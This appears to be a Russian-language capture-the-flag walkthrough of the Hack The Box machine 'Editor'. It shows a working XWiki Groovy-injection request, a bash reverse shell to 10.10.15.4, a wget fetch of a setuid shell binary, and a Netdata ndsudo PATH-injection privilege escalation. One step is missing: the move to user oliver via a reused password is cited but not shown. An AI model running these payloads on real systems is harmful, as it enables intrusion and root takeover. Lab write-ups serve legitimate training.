# Editor — Hack The Box Walkthrough

## 1. Разведка (Reconnaissance)

```bash
sudo nmap -sV -sC -p- editor.htb
```

**Результат:**
- `22/tcp` — SSH (OpenSSH 8.9p1 Ubuntu)
- `80/tcp` — nginx, сайт "Editor - SimplistCode Pro"
- `8080/tcp` — Jetty 10.0.20, хостит **XWiki**

## 2. Идентификация версии XWiki

```bash
curl -s http://editor.htb:8080/xwiki/bin/view/Main/WebHome | grep -i xwikiplatformversion -A2
```

Футер страницы показывает:
```
XWiki Debian 15.10.8
```

## 3. Поиск уязвимости по версии

Официальный synopsis HTB подтверждает: эта версия уязвима к **CVE-2025-24893** — неаутентифицированная RCE через Groovy-инъекцию в эндпоинте `SolrSearch` (CVSS 9.8, GHSA-rr6p-3pfg-562j). Патч вышел в 15.10.11 — наша версия (15.10.8) ниже порога.

## 4. Подтверждение уязвимости

Собранный в Burp Repeater запрос на чтение `/etc/passwd`:
```
GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println(["/bin/bash","-c","cat /etc/passwd"].execute().text){{/groovy}}{{/async}} HTTP/1.1
Host: editor.htb:8080
```

**Разбор payload'а:**
- `}}}` — закрывает текущий контекст wiki-разметки, "вырываясь" из параметра поиска
- `{{async async=false}}` — синхронный блок асинхронного выполнения макроса
- `{{groovy}}...{{/groovy}}` — блок Groovy-кода
- `["/bin/bash","-c","..."].execute().text` — Groovy-синтаксис выполнения shell-команды с получением вывода

Ответ содержит полное содержимое `/etc/passwd`, включая пользователей `xwiki`, `oliver`, `netdata` — RCE подтверждён.

## 5. Получение reverse shell через Burp Repeater

**Генерируем reverse-shell payload в base64:**
```bash
echo -n 'bash -i >& /dev/tcp/10.10.15.4/9009 0>&1' | base64 -w0
```

**Листенер:**
```bash
nc -lvnp 9009
```

**Запрос в Burp Repeater:**
```
GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println(["/bin/bash","-c","echo <BASE64> | base64 -d | bash"].execute().text){{/groovy}}{{/async}} HTTP/1.1
Host: editor.htb:8080
```

Отправляем через **Send** — в окне `nc` прилетает подключение от `xwiki`.

**Стабилизация шелла:**
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## 7. Enumeration для privesc

```bash
sudo -l
# Sorry, user oliver may not run sudo on editor.

id
# uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)

find / -perm -4000 -type f 2>/dev/null
```

Находим SUID-бинарники Netdata, включая:
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

```bash
stat /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
# -rwsr-x--- root netdata, Apr 1 2024
```

`oliver` состоит в группе `netdata` → имеет право выполнять `ndsudo` с правами root через SUID.

## 8. Идентификация CVE-2024-32019 (PATH injection в ndsudo)

`ndsudo` вызывает системные утилиты (например, `nvme`) **по имени**, без полного пути — полагаясь на `$PATH`. Это классическая уязвимость PATH-инъекции для SUID-бинарников.

## 9. Подготовка вредоносного бинарника

**На Kali — компилируем ELF с явным setuid(0):**
```c
// setuid.c
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc setuid.c -o nvme
```

**Важный нюанс:** первая попытка через простой bash-скрипт (`#!/bin/bash\nbash`) **не сработала** — ядро Linux игнорирует SUID-бит для shebang-скриптов. Рабочим оказался только скомпилированный бинарник с явным системным вызовом `setuid()`.

**Раздаём файл по HTTP:**
```bash
python3 -m http.server
```

## 10. Доставка и PATH-инъекция на целевой машине

```bash
cd /dev/shm
wget http://10.10.15.4:8000/nvme
chmod +x nvme
export PATH=$(pwd):$PATH
```

## 11. Триггер уязвимости

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

`ndsudo` ищет команду `nvme` в `$PATH`, находит её первой в `/dev/shm` (нашу поддельную версию) вместо системной, и выполняет её с правами root благодаря SUID-биту.

## Ключевые уроки машины

1. **CVE-хантинг по footer-версии** — XWiki прямо показывает версию внизу страницы, не нужно гадать.
2. **Groovy-инъекция через wiki-макросы** — `{{async}}`/`{{groovy}}` синтаксис XWiki позволяет вырваться из контекста разметки при отсутствии валидации параметра.
3. **Password reuse между приложением и БД** — пароль из `hibernate.cfg.xml` сработал и для SSH-пользователя.
4. **PATH-инъекция для SUID-бинарников** — если SUID-программа вызывает дочерние команды по относительному имени, а не по полному пути, и атакующий контролирует `$PATH` — это прямой путь к privesc.
5. **SUID не работает на shell-скриптах** — ядро Linux игнорирует SUID-бит на файлах с shebang (`#!/bin/bash`), только на скомпилированных ELF-бинарниках с явным `setuid()` в коде.
